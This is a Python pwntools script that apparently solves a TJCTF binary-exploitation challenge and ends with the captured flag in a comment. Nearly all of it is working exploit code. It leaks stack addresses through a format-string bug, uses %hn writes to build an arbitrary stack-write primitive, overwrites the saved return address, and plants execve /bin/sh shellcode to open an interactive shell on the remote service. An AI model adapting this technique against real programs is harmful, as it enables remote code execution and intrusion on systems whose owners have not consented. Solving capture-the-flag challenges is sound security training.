from pwn import *

p = remote("tjc.tf", 31363)

"""
%  6$p (0x...e6b0)  <-- rsp
%  7$p (0x...e6b8)
...
% 12$p (0x...e6e0)  <-- &inputBuffer
...
...
...
%141$p (0x...eae8)  <-- canary, 0xeae8 = 0xe6e0 + 1032 = 0xe6e0 + (141-12)*8
...
%143$p (0x...eaf8)  <-- return address
"""

leak = p.recvline().strip()
addr_inputBuffer, addr_balance = leak.split(b", ")
print("&inputBuffer:", addr_inputBuffer)  # &inputBuffer: b'0x7ffd31e364e0'


def deposit(payload):
    p.recvuntil(b"|exit) ")
    p.sendline(b"deposit")
    p.recvuntil(b"amount: ")
    p.sendline(payload)
    debug_output = p.recvline().strip()
    p.recvline()  # b'$... added to account\n'
    return debug_output


def get_write_stack_fn(pair):
    # find a pair (x, y) that [value of %x$p] is [stack address of %y$p]
    # also, [value of %x$p] and [value of %y$p] should be only 2B apart
    x, y = pair
    int_value_of_x = int(deposit(f"%{x}$p".encode()), 16)
    int_value_of_y = int(deposit(f"%{y}$p".encode()), 16)
    int_stack_addr_of_y = int(addr_inputBuffer, 16) + (y - 12) * 8
    assert int_value_of_x == int_stack_addr_of_y, f"Invalid pair!"
    assert int_value_of_x ^ int_value_of_y <= 0xFFFF, f"Invalid pair!!"

    def write_stack(dst_addr, dst_value):
        deposit(f"%{dst_addr&0xFFFF}c%{x}$hn".encode())
        deposit(f"%{dst_value&0xFFFF}c%{y}$hn".encode())

    addr_base = (int_value_of_x & 0xFFFFFFFFFFFF0000) >> 16

    return write_stack, addr_base


write_stack, addr_base = get_write_stack_fn(pair=(16, 56))


# overwrite return address
addr_shellcode = int(addr_inputBuffer, 16) + (100 - 12) * 8  # %100$p
addr_return = int(addr_inputBuffer, 16) + (143 - 12) * 8  # %143$p
write_stack(addr_return, addr_shellcode & 0xFFFF)
write_stack(addr_return + 2, addr_base & 0xFFFF)
write_stack(addr_return + 4, addr_base >> 16)

# write shellcode
# >>> from pwn import *
# >>> context.arch = "amd64"
# >>> context.os = "linux"
# >>> print(asm(shellcraft.sh()))
# b'jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05'
shellcode = b"\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x68\x72\x69\x01\x01\x81\x34\x24\x01\x01\x01\x01\x31\xf6\x56\x6a\x08\x5e\x48\x01\xe6\x56\x48\x89\xe6\x31\xd2\x6a\x3b\x58\x0f\x05"
p.recvuntil(b"|exit) ")
p.sendline(b"A" * (100 - 12) * 8 + shellcode)
print(p.recvline())  # b'Please enter a valid option\n'

# check
print(deposit(b"%100$p"))  # b'0x6e69622fb848686a'
print(deposit(b"%143$p"), hex(addr_shellcode))  # b'0x7ffd31e367a0' 0x7ffd31e367a0

# exploit!
p.recvuntil(b"|exit) ")
p.sendline(b"exit")
p.interactive()

# tjctf{sys_c4ll3d_l1nux_294835}
